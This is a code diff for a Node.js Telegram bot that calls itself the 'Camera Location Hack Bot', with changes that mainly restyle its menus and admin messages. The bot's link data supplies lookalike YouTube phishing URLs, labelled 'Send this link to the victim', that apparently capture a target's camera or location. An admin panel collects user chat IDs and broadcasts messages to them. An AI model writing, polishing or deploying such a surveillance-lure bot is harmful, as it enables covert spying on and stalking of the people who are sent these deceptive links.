@@ -15,11 +15,11 @@ const app = express();
 // Data for bot
 const linkData = [
   {
-    name: "📷 camera hack 📷",
+    name: "📷 Camera Hack 📷",
     links: [{ text: "🌍 Costam domen =  ❤️ YouTube ❤️ Send this link to the victim", value: "https://youthub-video.odoo.com/" }]
   },
   {
-    name: "🌍 location 🌍",
+    name: "🌍 Location Hack 🌍",
     links: [{ text: "Costam domen =  ❤️ YouTube ❤️ Send this link to the victim", value: "https://y0uthub-c0m-vide0.odoo.com/1-1/" }]
   }
 ];
@@ -83,9 +83,14 @@ function addChatId(chatId) {
 bot.onText(/\/start/, async (msg) => {
   const chatId = msg.chat.id;
   saveChatId(chatId);
-  const menu = generateMainMenu().map(a => [{ text: a.text, callback_data: a.callback_data }]);
-  await bot.sendMessage(chatId, "🎉 Welcome to the camera location hack Bot! Choose an option below:", {
-    reply_markup: { inline_keyboard: menu }
+
+  // Send welcome message with GIF and formatted text
+  await bot.sendAnimation(chatId, "https://media.giphy.com/media/3o7abAHdYvZdBNnGZq/giphy.gif", {
+    caption: "*🎉 Welcome to the Camera Location Hack Bot!* \n\nChoose an option below:",
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: generateMainMenu().map(a => [{ text: a.text, callback_data: a.callback_data }])
+    }
   });
 });
 
@@ -111,9 +116,12 @@ bot.on('callback_query', async (callbackQuery) => {
       reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "back_to_main" }]] }
     });
   } else if (data === 'back_to_main') {
-    const menu = generateMainMenu().map(a => [{ text: a.text, callback_data: a.callback_data }]);
-    await bot.sendMessage(chatId, "🎉 Welcome to the camera location hack bot! Choose an option below:", {
-      reply_markup: { inline_keyboard: menu }
+    await bot.sendAnimation(chatId, "https://media.giphy.com/media/3o7abAHdYvZdBNnGZq/giphy.gif", {
+      caption: "*🎉 Welcome to the Camera Location Hack Bot!* \n\nChoose an option below:",
+      parse_mode: "Markdown",
+      reply_markup: {
+        inline_keyboard: generateMainMenu().map(a => [{ text: a.text, callback_data: a.callback_data }])
+      }
     });
   }
 });
@@ -138,7 +146,10 @@ bot.onText(/\/admin/, async (msg) => {
         ]
       }
     };
-    await bot.sendMessage(chatId, `🔐 Admin Panel\nTotal Users: ${users.length}`, adminMenu);
+    await bot.sendMessage(chatId, `🔐 *Admin Panel*\nTotal Users: ${users.length}`, {
+      parse_mode: "Markdown",
+      reply_markup: adminMenu.reply_markup
+    });
   }
 });
 
@@ -149,10 +160,12 @@ bot.on('callback_query', async (callbackQuery) => {
   if (chatId.toString() === ADMIN_ID) {
     if (data === 'admin_users') {
       const users = fs.readFileSync('users.txt', 'utf8').split('\n').filter(id => id);
-      await bot.sendMessage(chatId, `📊 Total Users: ${users.length}\n\nUser IDs:\n${users.join('\n')}`);
+      await bot.sendMessage(chatId, `📊 *Total Users:* ${users.length}\n\n*User IDs:*\n${users.join('\n')}`, {
+        parse_mode: "Markdown"
+      });
     } else if (data === 'admin_broadcast') {
       broadcastStates.set(chatId, true);
-      await bot.sendMessage(chatId, '📢 Send your broadcast message (text, image or video):');
+      await bot.sendMessage(chatId, '📢 Send your broadcast message (text, image, or video):');
     } else if (data === 'admin_download_chat_ids') {
       const filePath = path.join(__dirname, 'users.txt');
       await bot.sendDocument(chatId, filePath);
@@ -191,7 +204,9 @@ bot.on('message', async (msg) => {
       }
     }
 
-    await bot.sendMessage(chatId, `📢 Broadcast completed!\nSuccess: ${successCount}\nFailed: ${failCount}`);
+    await bot.sendMessage(chatId, `📢 *Broadcast completed!*\nSuccess: ${successCount}\nFailed: ${failCount}`, {
+      parse_mode: "Markdown"
+    });
   } else if (chatId.toString() === ADMIN_ID && deleteChatIdState.get(chatId)) {
     deleteChatIdState.delete(chatId);
     const chatIdToDelete = msg.text;
